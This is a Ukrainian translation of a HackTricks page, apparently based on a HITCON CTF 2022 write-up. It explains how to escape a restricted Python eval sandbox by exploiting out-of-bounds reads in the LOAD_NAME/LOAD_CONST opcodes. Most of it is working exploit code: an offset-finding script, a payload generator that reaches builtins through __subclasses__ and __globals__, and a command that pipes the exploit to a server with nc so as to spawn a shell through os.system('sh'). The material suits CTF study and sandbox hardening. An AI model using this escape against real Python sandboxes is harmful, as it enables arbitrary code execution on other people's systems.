# Зчитування опкоду LOAD\_NAME / LOAD\_CONST для OOB читання

{% hint style="success" %}
Вивчайте та вправляйтесь в хакінгу AWS: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Навчання AWS Red Team Expert (ARTE) від HackTricks**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Вивчайте та вправляйтесь в хакінгу GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Навчання GCP Red Team Expert (GRTE) від HackTricks**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримайте HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Поширюйте хакерські трюки, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.

</details>
{% endhint %}

**Ця інформація була взята** [**з цього опису**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

Ми можемо використовувати функціонал OOB читання в опкоді LOAD\_NAME / LOAD\_CONST, щоб отримати деякий символ у пам'яті. Це означає використання трюку типу `(a, b, c, ... сотні символів ..., __getattribute__) if [] else [].__getattribute__(...)` для отримання потрібного символу (наприклад, назви функції), який вам потрібен.

Потім просто створіть свій експлойт.

### Огляд <a href="#overview-1" id="overview-1"></a>

Вихідний код досить короткий, містить лише 4 рядки!
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
### Виход за межі читання <a href="#out-of-bound-read" id="out-of-bound-read"></a>

Як відбувається збій сегментації?

Давайте почнемо з простого прикладу, `[a, b, c]` може скомпілюватися в наступний байт-код.
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
Проте що, якщо `co_names` стає порожнім кортежем? Опкод `LOAD_NAME 2` все одно виконується і намагається прочитати значення з тієї адреси пам'яті, з якої воно початково мало б бути. Так, це функція зчитування "за межами меж".

Основна концепція рішення проста. Деякі опкоди в CPython, наприклад `LOAD_NAME` та `LOAD_CONST`, є вразливими (?) на OOB read.

Вони отримують об'єкт з індексом `oparg` з кортежу `consts` або `names` (це те, що приховано під назвами `co_consts` та `co_names`). Ми можемо звернутися до наступного короткого відрізка про `LOAD_CONST`, щоб побачити, що робить CPython під час обробки опкоду `LOAD_CONST`.
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
Таким чином ми можемо використовувати функціонал OOB, щоб отримати "ім'я" з довільного зміщення пам'яті. Щоб переконатися, яке це ім'я та яке його зміщення, просто продовжуйте спробувати `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... І ви можете знайти щось приблизно з oparg > 700. Ви також можете спробувати використати gdb, щоб краще розібратися у структурі пам'яті, звісно, але я не думаю, що це буде простіше?

### Генерація Експлоіту <a href="#generating-the-exploit" id="generating-the-exploit"></a>

Після того, як ми отримали корисні зміщення для імен / констант, як ми _можемо_ отримати ім'я / константу з цього зміщення та використовувати його? Ось хитрість для вас:\
Давайте припустимо, що ми можемо отримати ім'я `__getattribute__` зі зміщенням 5 (`LOAD_NAME 5`) з `co_names=()`, тоді просто виконайте наступні дії:
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> Зверніть увагу, що не обов'язково називати його `__getattribute__`, ви можете назвати його якось коротше або дивніше

Ви можете зрозуміти причину, просто переглянувши його байткод:
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
Зверніть увагу, що `LOAD_ATTR` також отримує ім'я з `co_names`. Python завантажує імена з тієї самої позиції, якщо ім'я однакове, тому другий `__getattribute__` все ще завантажується з позиції offset=5. Використовуючи цю функцію, ми можемо використовувати довільне ім'я, якщо ім'я знаходиться в пам'яті поруч.

Для генерації чисел повинно бути тривіально:

* 0: not \[\[]]
* 1: not \[]
* 2: (not \[]) + (not \[])
* ...

### Сценарій експлойту <a href="#exploit-script-1" id="exploit-script-1"></a>

Я не використовував константи через обмеження довжини.

Спочатку ось скрипт для пошуку цих зміщень імен.
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
І наступне призначене для створення реального Python експлойту.
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
Це в основному робить наступне для тих рядків, які ми отримуємо з методу `__dir__`:
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
{% hint style="success" %}
Вивчайте та практикуйте хакінг AWS: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Школа хакінгу HackTricks для експертів червоної команди AWS (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Вивчайте та практикуйте хакінг GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Школа хакінгу HackTricks для експертів червоної команди GCP (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримайте HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Поширюйте хакерські трюки, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.

</details>
{% endhint %}
